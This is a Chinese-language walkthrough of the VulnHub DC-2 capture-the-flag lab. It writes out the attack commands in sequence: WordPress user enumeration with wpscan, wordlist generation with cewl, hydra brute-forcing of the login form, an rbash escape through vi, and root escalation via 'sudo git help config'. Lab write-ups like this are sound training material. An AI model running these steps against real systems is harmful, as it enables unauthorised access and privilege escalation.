# DC2  

## 简述 
目标站点直接爆破，提权使用不使用sudo也可以进行提权的命令
难点 密码生成 密码爆破  变化的端口地址  shell 变量设置  如何拿到交互的shell 使用sudo 命令进行提权  
靶机地址 https://www.vulnhub.com/entry/dc-2,311/   

## 寻找漏洞
### 踩点，探寻服务  
首先本次靶机需要配置hosts文件让ip地址和dc-2一一进行对应  
![20211017000033](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000033.png)
设置hosts  
![20211017000046](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000046.png)
打开网页发现其中第一个flag  
**第一个flag提示我们使用cewl进行生成密码**  
![20211017000054](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000054.png)


### 密码生成爆破  

使用wpscan对wp站点进行扫描  （wpscan扫描漏洞插件还是需要api所以推荐去官网免费拿一个api）
wpscan --url [url] -e u #扫描网站并且返回wp当中的用户  
生成wordpress的用户  
```
wpscan --url http://dc-2/  --api-token api w -e u  
```  
使用cewl生成一个指定页面的字典，使用字典进入  
```
cewl -w pass url  
```
使用hydra进行爆破  
```
hydra -L login -P pass.txt dc-2 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:<strong>ERROR</strong>' -v  
```
post方式进行提交 ''当中存放访问的网页:登录提交的报文:登录失败的返回信息  
也可以使用wpscan,推荐还是使用wpscan这样就避免使用抓包配置很麻烦的!   
```
wpscan --url -P pass.txt 
```
![20211017000107](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000107.png)
之后我们进入wordpress的后台(可以使用dirsearch进行爆破，我这里是用的通用后台地址)使用jerry账户登录  
查看到flag2  
![20211017000116](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000116.png)
## 提权
我们拿到密码之后发现并不能直接登录ssh的22端口，重新对服务器的ip探测端口    
![20211017000125](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000125.png)
顺利拿到一个权限，同时发现是一个rbash权限  

### 绕过rbash  
**什么是rbash？**   
顾名思义就是restrict bash 受限制的bash  
其中存在很多命令 输出符都不能进行使用  
使用vi绕过rbash  ，查看其中的环境变量顺带设置(export)    
![20211017000138](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000138.png)
export PATH=$PATH:/bin/
**存在的目的？**  
1. 提高安全性  
2. 防止后续的渗透  
3. 创建rbash防止自己输入一些危险的命令  
**如何进行绕过？**  
执行bin/sh[直接执行，cp命令]  
利用常见的编程语言执行bash  
设置环境变量进行执行[vim git等可以操作的命令]  
过程  
vi 打开任意一个文件  然后console当中  
set shell=/bin/sh
![20211017000154](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000154.png)
shell  
![20191123140720.png](https://i.loli.net/2019/11/23/RsqKDr7locLdVFC.png)   
拿到一个bin/sh 就不是rbash了，就能使用很多命令了  
然后在shell当中export查看和设置环境变量就能执行更多的命令
![20211017000208](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000208.png)
**第三个flag提示我们登录到另外一个用户**   
之前直接ssh登录是不行的  

### root提权
登录到另外一个用户，不是root  
```
sudo -l 查看不使用su就能以root执行的命令
```
![20191127193507.png](https://i.loli.net/2019/11/27/45nfB2QSiOzeCIK.png)  
下面就使用git提权  
**第四个flag没有给提示**  
![20211017000331](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000331.png) 
那么下面就尝试使用git去提权
sudo git help config  
![20211017000356](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000356.png)
!/bin/sh  之后 
![20211017000406](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000406.png)  
顺利拿到flag  
## 总结

### 思考&&操作    
使用网页生成密码，进入服务器，绕过rbash之后使用git进行提权
扫描用户  wpscan --url http://dc-2/  --api-token api w -e u    
生成密码  cewl -w pass url   
爆破开始  wpscan --url -P pass.txt  
绕过  rbash export PATH=$PATH:/bin/   
git提权  sudo git help config   !/bin/sh  
### 问题  
**绕过rbash的其他方法**
**如何让rbash坚固**
**git提权的原理**  
**sudo-l 和  find / -perm -u=s -type f 2>/dev/null**

### 链接  
https://www.it2021.com/penetration/409.html  
https://www.freebuf.com/articles/system/188989.html  
http://www.52bug.cn/hkjs/3897.html  
https://www.tunnelsup.com/hash-analyzer/  


